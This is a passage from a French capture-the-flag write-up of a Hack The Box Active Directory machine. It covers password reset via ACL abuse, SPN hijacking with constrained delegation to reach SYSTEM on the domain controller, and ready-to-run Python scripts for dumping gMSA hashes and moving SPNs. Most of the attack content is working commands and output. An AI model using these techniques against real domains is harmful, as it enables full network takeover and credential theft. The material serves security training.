+</span></span></code></pre></div><p><strong>Pourquoi DefaultPassword ?</strong> WEB01 est configuré avec un autologon Windows pour <code>a.white</code>. Le password est stocké en clair dans le registre <code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\DefaultPassword</code> et extrait par secretsdump via les LSA Secrets.</p>
+<hr>
+<h2 id="phase-6---awhite--awhite_adm--domain-admin">Phase 6 - a.white → a.white_adm → Domain Admin<a hidden class="anchor" aria-hidden="true" href="#phase-6---awhite--awhite_adm--domain-admin">#</a></h2>
+<h3 id="forcechangepassword">ForceChangePassword<a hidden class="anchor" aria-hidden="true" href="#forcechangepassword">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Valider les creds de a.white</span>
+</span></span><span style="display:flex;"><span>nxc smb 10.129.15.19 -u <span style="color:#e6db74">&#39;a.white&#39;</span> -p <span style="color:#e6db74">&#39;E2nvAOKSz5Xz2MJu&#39;</span> -d pirate.htb
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># a.white a ForceChangePassword sur a.white_adm (vu dans BloodHound)</span>
+</span></span><span style="display:flex;"><span>source /etc/Certipy/certipy-venv/bin/activate
+</span></span><span style="display:flex;"><span>bloodyAD -d pirate.htb -u <span style="color:#e6db74">&#39;a.white&#39;</span> -p <span style="color:#e6db74">&#39;E2nvAOKSz5Xz2MJu&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --host 10.129.15.19 set password <span style="color:#e6db74">&#39;a.white_adm&#39;</span> <span style="color:#e6db74">&#39;Hacked123!&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># [+] Password changed successfully!</span>
+</span></span></code></pre></div><p><strong>Pourquoi ForceChangePassword ?</strong> Cet ACL AD permet de reset le password d&rsquo;un user sans connaître l&rsquo;ancien. C&rsquo;est différent de &ldquo;Change Password&rdquo; qui nécessite l&rsquo;ancien password.</p>
+<h3 id="spn-hijacking">SPN Hijacking<a hidden class="anchor" aria-hidden="true" href="#spn-hijacking">#</a></h3>
+<p><strong>Rappel de la situation :</strong></p>
+<ul>
+<li><code>a.white_adm</code> a <strong>Constrained Delegation</strong> vers <code>HTTP/WEB01.pirate.htb</code></li>
+<li><code>a.white_adm</code> est dans le groupe <strong>IT</strong> qui a <strong>WriteSPN</strong> sur DC01$</li>
+</ul>
+<p><strong>L&rsquo;idée :</strong> Déplacer le SPN <code>HTTP/WEB01.pirate.htb</code> de WEB01$ vers DC01$. Quand on demandera un ticket via KCD pour ce SPN, le KDC chiffrera le ticket avec la clé de <strong>DC01$</strong> (puisque le SPN est maintenant sur DC01). On pourra ensuite réécrire le service en <code>CIFS/DC01.pirate.htb</code> et le DC acceptera le ticket.</p>
+<h3 id="script-de-spn-hijacking">Script de SPN Hijacking<a hidden class="anchor" aria-hidden="true" href="#script-de-spn-hijacking">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;spn_hijack.py - Move HTTP/WEB01.pirate.htb from WEB01$ to DC01$&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> ldap3
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>server <span style="color:#f92672">=</span> ldap3<span style="color:#f92672">.</span>Server(<span style="color:#e6db74">&#39;ldap://10.129.15.19&#39;</span>)
+</span></span><span style="display:flex;"><span>conn <span style="color:#f92672">=</span> ldap3<span style="color:#f92672">.</span>Connection(server, <span style="color:#e6db74">&#39;pirate.htb</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">a.white_adm&#39;</span>, <span style="color:#e6db74">&#39;Hacked123!&#39;</span>,
+</span></span><span style="display:flex;"><span>                        authentication<span style="color:#f92672">=</span>ldap3<span style="color:#f92672">.</span>NTLM, auto_bind<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;[+] Bound as: </span><span style="color:#e6db74">{</span>conn<span style="color:#f92672">.</span>extend<span style="color:#f92672">.</span>standard<span style="color:#f92672">.</span>who_am_i()<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Remove HTTP/WEB01.pirate.htb from WEB01$</span>
+</span></span><span style="display:flex;"><span>conn<span style="color:#f92672">.</span>modify(<span style="color:#e6db74">&#39;CN=WEB01,CN=Computers,DC=pirate,DC=htb&#39;</span>,
+</span></span><span style="display:flex;"><span>    {<span style="color:#e6db74">&#39;servicePrincipalName&#39;</span>: [(ldap3<span style="color:#f92672">.</span>MODIFY_DELETE, [<span style="color:#e6db74">&#39;HTTP/WEB01.pirate.htb&#39;</span>])]})
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;[*] Remove SPN from WEB01$: </span><span style="color:#e6db74">{</span>conn<span style="color:#f92672">.</span>result[<span style="color:#e6db74">&#34;description&#34;</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Remove HTTP/WEB01 too (short form)</span>
+</span></span><span style="display:flex;"><span>conn<span style="color:#f92672">.</span>modify(<span style="color:#e6db74">&#39;CN=WEB01,CN=Computers,DC=pirate,DC=htb&#39;</span>,
+</span></span><span style="display:flex;"><span>    {<span style="color:#e6db74">&#39;servicePrincipalName&#39;</span>: [(ldap3<span style="color:#f92672">.</span>MODIFY_DELETE, [<span style="color:#e6db74">&#39;HTTP/WEB01&#39;</span>])]})
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;[*] Remove SPN HTTP/WEB01 from WEB01$: </span><span style="color:#e6db74">{</span>conn<span style="color:#f92672">.</span>result[<span style="color:#e6db74">&#34;description&#34;</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Add HTTP/WEB01.pirate.htb to DC01$</span>
+</span></span><span style="display:flex;"><span>conn<span style="color:#f92672">.</span>modify(<span style="color:#e6db74">&#39;CN=DC01,OU=Domain Controllers,DC=pirate,DC=htb&#39;</span>,
+</span></span><span style="display:flex;"><span>    {<span style="color:#e6db74">&#39;servicePrincipalName&#39;</span>: [(ldap3<span style="color:#f92672">.</span>MODIFY_ADD, [<span style="color:#e6db74">&#39;HTTP/WEB01.pirate.htb&#39;</span>])]})
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;[*] Add SPN to DC01$: </span><span style="color:#e6db74">{</span>conn<span style="color:#f92672">.</span>result[<span style="color:#e6db74">&#34;description&#34;</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 spn_hijack.py
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># [+] Bound as: u:PIRATE\a.white_adm</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># [*] Remove SPN from WEB01$: success</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># [*] Remove SPN HTTP/WEB01 from WEB01$: success</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># [*] Add SPN to DC01$: success</span>
+</span></span></code></pre></div><h3 id="kcd--alt-service--domain-admin">KCD + Alt-Service → Domain Admin<a hidden class="anchor" aria-hidden="true" href="#kcd--alt-service--domain-admin">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># 1. Obtenir un TGT frais pour a.white_adm</span>
+</span></span><span style="display:flex;"><span>faketime -f <span style="color:#e6db74">&#39;+7h&#39;</span> impacket-getTGT <span style="color:#e6db74">&#39;pirate.htb/a.white_adm:Hacked123!&#39;</span> -dc-ip 10.129.15.19
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 2. S4U2Self + S4U2Proxy avec alt-service</span>
+</span></span><span style="display:flex;"><span>export KRB5CCNAME<span style="color:#f92672">=</span>a.white_adm.ccache
+</span></span><span style="display:flex;"><span>faketime -f <span style="color:#e6db74">&#39;+7h&#39;</span> impacket-getST <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -spn <span style="color:#e6db74">&#39;HTTP/WEB01.pirate.htb&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -impersonate Administrator <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -dc-ip 10.129.15.19 <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -k -no-pass <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -altservice <span style="color:#e6db74">&#39;CIFS/DC01.pirate.htb&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  <span style="color:#e6db74">&#39;pirate.htb/a.white_adm&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># [*] Saving ticket in Administrator@CIFS_DC01.pirate.htb@PIRATE.HTB.ccache</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 3. SYSTEM shell sur le DC</span>
+</span></span><span style="display:flex;"><span>export KRB5CCNAME<span style="color:#f92672">=</span>Administrator@CIFS_DC01.pirate.htb@PIRATE.HTB.ccache
+</span></span><span style="display:flex;"><span>faketime -f <span style="color:#e6db74">&#39;+7h&#39;</span> impacket-psexec -k -no-pass <span style="color:#e6db74">&#39;pirate.htb/Administrator@DC01.pirate.htb&#39;</span>
+</span></span></code></pre></div><p><strong>Pourquoi <code>-altservice</code> ?</strong> Le ticket S4U2Proxy est chiffré avec la clé du service cible. Puisqu&rsquo;on a déplacé le SPN <code>HTTP/WEB01.pirate.htb</code> sur DC01$, le ticket est chiffré avec la clé de DC01$. En réécrivant le nom de service en <code>CIFS/DC01.pirate.htb</code>, le DC accepte le ticket car :</p>
+<ol>
+<li>Il est chiffré avec sa propre clé (valide)</li>
+<li>Le nom de service CIFS est accepté pour l&rsquo;accès fichier/admin</li>
+<li>Le ticket impersonne Administrator → <strong>SYSTEM !</strong></li>
+</ol>
+<h3 id="root-flag">Root Flag<a hidden class="anchor" aria-hidden="true" href="#root-flag">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>C:\Windows\system32<span style="color:#75715e">&gt; type C:\Users\Administrator\Desktop\root.txt</span>
+</span></span><span style="display:flex;"><span>785f845ea1967d0c434cd350f1468ad1
+</span></span></code></pre></div><hr>
+<h2 id="kill-chain-visuel">Kill Chain Visuel<a hidden class="anchor" aria-hidden="true" href="#kill-chain-visuel">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>┌─────────────────────────────────────────┐
+</span></span><span style="display:flex;"><span>│ pentest (Domain User)                   │
+</span></span><span style="display:flex;"><span>│ p3nt3st2025!&amp;                           │
+</span></span><span style="display:flex;"><span>└──────────────────┬──────────────────────┘
+</span></span><span style="display:flex;"><span>                   │ Pre-Windows 2000
+</span></span><span style="display:flex;"><span>                   │ password = machine name
+</span></span><span style="display:flex;"><span>┌──────────────────▼──────────────────────┐
+</span></span><span style="display:flex;"><span>│ MS01$ (password: ms01)                  │
+</span></span><span style="display:flex;"><span>│ Groupe: Domain Secure Servers           │
+</span></span><span style="display:flex;"><span>└──────────────────┬──────────────────────┘
+</span></span><span style="display:flex;"><span>                   │ ReadGMSAPassword
+</span></span><span style="display:flex;"><span>                   │ (via Kerberos TGT + bloodyAD -k)
+</span></span><span style="display:flex;"><span>┌──────────────────▼──────────────────────┐
+</span></span><span style="display:flex;"><span>│ gMSA_ADCS_prod$                         │
+</span></span><span style="display:flex;"><span>│ NTLM: 25c7f0eb586ed3a91375dbf2f6e4a3ea │
+</span></span><span style="display:flex;"><span>│ Remote Management Users → WinRM DC01   │
+</span></span><span style="display:flex;"><span>└──────────────────┬──────────────────────┘
+</span></span><span style="display:flex;"><span>                   │ evil-winrm → ipconfig
+</span></span><span style="display:flex;"><span>                   │ Découverte 192.168.100.0/24
+</span></span><span style="display:flex;"><span>┌──────────────────▼──────────────────────┐
+</span></span><span style="display:flex;"><span>│ Ligolo-ng Pivot                         │
+</span></span><span style="display:flex;"><span>│ Agent sur DC01 → Tunnel vers interne    │
+</span></span><span style="display:flex;"><span>│ WEB01 découvert à 192.168.100.2         │
+</span></span><span style="display:flex;"><span>│ SMB signing: DISABLED                   │
+</span></span><span style="display:flex;"><span>└──────────────────┬──────────────────────┘
+</span></span><span style="display:flex;"><span>                   │ PetitPotam coercion
+</span></span><span style="display:flex;"><span>                   │ + ntlmrelayx → LDAP relay
+</span></span><span style="display:flex;"><span>                   │ + RBCD (delegate-access)
+</span></span><span style="display:flex;"><span>┌──────────────────▼──────────────────────┐
+</span></span><span style="display:flex;"><span>│ WEB01$ - RBCD configuré                 │
+</span></span><span style="display:flex;"><span>│ LPQQLPUC$ → S4U2Proxy → Admin WEB01    │
+</span></span><span style="display:flex;"><span>│ secretsdump -use-vss                    │
+</span></span><span style="display:flex;"><span>│ LSA Secret: a.white:E2nvAOKSz5Xz2MJu   │
+</span></span><span style="display:flex;"><span>└──────────────────┬──────────────────────┘
+</span></span><span style="display:flex;"><span>                   │ ForceChangePassword
+</span></span><span style="display:flex;"><span>┌──────────────────▼──────────────────────┐
+</span></span><span style="display:flex;"><span>│ a.white_adm (IT group)                  │
+</span></span><span style="display:flex;"><span>│ Constrained Delegation: HTTP/WEB01      │
+</span></span><span style="display:flex;"><span>│ IT → WriteSPN sur DC01$                 │
+</span></span><span style="display:flex;"><span>└──────────────────┬──────────────────────┘
+</span></span><span style="display:flex;"><span>                   │ SPN Hijacking
+</span></span><span style="display:flex;"><span>                   │ HTTP/WEB01 → move to DC01$
+</span></span><span style="display:flex;"><span>                   │ KCD + altservice → CIFS/DC01
+</span></span><span style="display:flex;"><span>┌──────────────────▼──────────────────────┐
+</span></span><span style="display:flex;"><span>│ DOMAIN ADMIN                            │
+</span></span><span style="display:flex;"><span>│ psexec → SYSTEM on DC01                 │
+</span></span><span style="display:flex;"><span>│ root.txt: 785f845ea1967d0c434cd350...   │
+</span></span><span style="display:flex;"><span>└─────────────────────────────────────────┘
+</span></span></code></pre></div><hr>
+<h2 id="scripts-custom">Scripts Custom<a hidden class="anchor" aria-hidden="true" href="#scripts-custom">#</a></h2>
+<h3 id="gmsa_dumppy">gmsa_dump.py<a hidden class="anchor" aria-hidden="true" href="#gmsa_dumppy">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;Read gMSA passwords using MS01$ machine account via NTLM auth&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> ldap3
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> hashlib
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>DC_IP <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;10.129.15.19&#39;</span>
+</span></span><span style="display:flex;"><span>DOMAIN <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;pirate.htb&#39;</span>
+</span></span><span style="display:flex;"><span>USERNAME <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;MS01$&#39;</span>
+</span></span><span style="display:flex;"><span>PASSWORD <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;ms01&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">extract_ntlm_from_managed_password</span>(blob):
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;Extract NTLM hash from msDS-ManagedPassword blob&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    current_pwd_offset <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#39;&lt;H&#39;</span>, blob[<span style="color:#ae81ff">8</span>:<span style="color:#ae81ff">10</span>])[<span style="color:#ae81ff">0</span>]
+</span></span><span style="display:flex;"><span>    pwd_bytes <span style="color:#f92672">=</span> blob[current_pwd_offset:current_pwd_offset <span style="color:#f92672">+</span> <span style="color:#ae81ff">256</span>]
+</span></span><span style="display:flex;"><span>    ntlm <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>new(<span style="color:#e6db74">&#39;md4&#39;</span>, pwd_bytes)<span style="color:#f92672">.</span>hexdigest()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> ntlm
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[*] Connecting to LDAP </span><span style="color:#e6db74">{</span>DC_IP<span style="color:#e6db74">}</span><span style="color:#e6db74"> as </span><span style="color:#e6db74">{</span>DOMAIN<span style="color:#e6db74">}</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">{</span>USERNAME<span style="color:#e6db74">}</span><span style="color:#e6db74"> via NTLM...&#34;</span>)
+</span></span><span style="display:flex;"><span>    server <span style="color:#f92672">=</span> ldap3<span style="color:#f92672">.</span>Server(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;ldap://</span><span style="color:#e6db74">{</span>DC_IP<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>, get_info<span style="color:#f92672">=</span>ldap3<span style="color:#f92672">.</span>ALL)
+</span></span><span style="display:flex;"><span>    conn <span style="color:#f92672">=</span> ldap3<span style="color:#f92672">.</span>Connection(server, user<span style="color:#f92672">=</span><span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>DOMAIN<span style="color:#e6db74">}</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">{</span>USERNAME<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>, password<span style="color:#f92672">=</span>PASSWORD,
+</span></span><span style="display:flex;"><span>                            authentication<span style="color:#f92672">=</span>ldap3<span style="color:#f92672">.</span>NTLM, auto_bind<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[+] Connected! Bound as: </span><span style="color:#e6db74">{</span>conn<span style="color:#f92672">.</span>extend<span style="color:#f92672">.</span>standard<span style="color:#f92672">.</span>who_am_i()<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    conn<span style="color:#f92672">.</span>search(<span style="color:#e6db74">&#39;DC=pirate,DC=htb&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;(objectClass=msDS-GroupManagedServiceAccount)&#39;</span>,
+</span></span><span style="display:flex;"><span>        attributes<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;sAMAccountName&#39;</span>, <span style="color:#e6db74">&#39;msDS-ManagedPassword&#39;</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> entry <span style="color:#f92672">in</span> conn<span style="color:#f92672">.</span>entries:
+</span></span><span style="display:flex;"><span>        name <span style="color:#f92672">=</span> entry<span style="color:#f92672">.</span>sAMAccountName<span style="color:#f92672">.</span>value
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[+] Account: </span><span style="color:#e6db74">{</span>name<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>            pwd_blob <span style="color:#f92672">=</span> entry[<span style="color:#e6db74">&#39;msDS-ManagedPassword&#39;</span>]<span style="color:#f92672">.</span>raw_values[<span style="color:#ae81ff">0</span>]
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> pwd_blob:
+</span></span><span style="display:flex;"><span>                ntlm <span style="color:#f92672">=</span> extract_ntlm_from_managed_password(pwd_blob)
+</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[+] NTLM Hash: </span><span style="color:#e6db74">{</span>ntlm<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[-] Cannot read msDS-ManagedPassword: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[-] Error: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span></code></pre></div><p><strong>Note :</strong> Ce script fonctionne en NTLM auth. Pour les comptes WORKSTATION_TRUST qui refusent le simple bind LDAP, utiliser plutôt bloodyAD avec Kerberos (<code>-k</code>) comme montré dans le writeup.</p>
+<h3 id="spn_hijackpy">spn_hijack.py<a hidden class="anchor" aria-hidden="true" href="#spn_hijackpy">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;SPN Hijacking - Move HTTP/WEB01.pirate.htb from WEB01$ to DC01$&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> ldap3
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>server <span style="color:#f92672">=</span> ldap3<span style="color:#f92672">.</span>Server(<span style="color:#e6db74">&#39;ldap://10.129.15.19&#39;</span>)
+</span></span><span style="display:flex;"><span>conn <span style="color:#f92672">=</span> ldap3<span style="color:#f92672">.</span>Connection(server, <span style="color:#e6db74">&#39;pirate.htb</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">a.white_adm&#39;</span>, <span style="color:#e6db74">&#39;Hacked123!&#39;</span>,
+</span></span><span style="display:flex;"><span>                        authentication<span style="color:#f92672">=</span>ldap3<span style="color:#f92672">.</span>NTLM, auto_bind<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;[+] Bound as: </span><span style="color:#e6db74">{</span>conn<span style="color:#f92672">.</span>extend<span style="color:#f92672">.</span>standard<span style="color:#f92672">.</span>who_am_i()<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Remove HTTP/WEB01.pirate.htb from WEB01$</span>
+</span></span><span style="display:flex;"><span>conn<span style="color:#f92672">.</span>modify(<span style="color:#e6db74">&#39;CN=WEB01,CN=Computers,DC=pirate,DC=htb&#39;</span>,
+</span></span><span style="display:flex;"><span>    {<span style="color:#e6db74">&#39;servicePrincipalName&#39;</span>: [(ldap3<span style="color:#f92672">.</span>MODIFY_DELETE, [<span style="color:#e6db74">&#39;HTTP/WEB01.pirate.htb&#39;</span>])]})
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;[*] Remove SPN from WEB01$: </span><span style="color:#e6db74">{</span>conn<span style="color:#f92672">.</span>result[<span style="color:#e6db74">&#34;description&#34;</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Remove HTTP/WEB01 too</span>
+</span></span><span style="display:flex;"><span>conn<span style="color:#f92672">.</span>modify(<span style="color:#e6db74">&#39;CN=WEB01,CN=Computers,DC=pirate,DC=htb&#39;</span>,
+</span></span><span style="display:flex;"><span>    {<span style="color:#e6db74">&#39;servicePrincipalName&#39;</span>: [(ldap3<span style="color:#f92672">.</span>MODIFY_DELETE, [<span style="color:#e6db74">&#39;HTTP/WEB01&#39;</span>])]})
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;[*] Remove SPN HTTP/WEB01 from WEB01$: </span><span style="color:#e6db74">{</span>conn<span style="color:#f92672">.</span>result[<span style="color:#e6db74">&#34;description&#34;</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Add HTTP/WEB01.pirate.htb to DC01$</span>
+</span></span><span style="display:flex;"><span>conn<span style="color:#f92672">.</span>modify(<span style="color:#e6db74">&#39;CN=DC01,OU=Domain Controllers,DC=pirate,DC=htb&#39;</span>,
+</span></span><span style="display:flex;"><span>    {<span style="color:#e6db74">&#39;servicePrincipalName&#39;</span>: [(ldap3<span style="color:#f92672">.</span>MODIFY_ADD, [<span style="color:#e6db74">&#39;HTTP/WEB01.pirate.htb&#39;</span>])]})
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;[*] Add SPN to DC01$: </span><span style="color:#e6db74">{</span>conn<span style="color:#f92672">.</span>result[<span style="color:#e6db74">&#34;description&#34;</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+</span></span></code></pre></div><h3 id="bloodhound_parserpy">bloodhound_parser.py<a hidden class="anchor" aria-hidden="true" href="#bloodhound_parserpy">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;Parse BloodHound JSON to find attack paths without the GUI&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> json
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>files <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>:] <span style="color:#f92672">or</span> [
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;users.json&#39;</span>, <span style="color:#e6db74">&#39;computers.json&#39;</span>, <span style="color:#e6db74">&#39;groups.json&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;domains.json&#39;</span>, <span style="color:#e6db74">&#39;containers.json&#39;</span>, <span style="color:#e6db74">&#39;ous.json&#39;</span>,
+</span></span><span style="display:flex;"><span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Build SID → name map</span>
+</span></span><span style="display:flex;"><span>sid_map <span style="color:#f92672">=</span> {}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> fpath <span style="color:#f92672">in</span> files:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">with</span> open(fpath) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>            data <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>load(f)
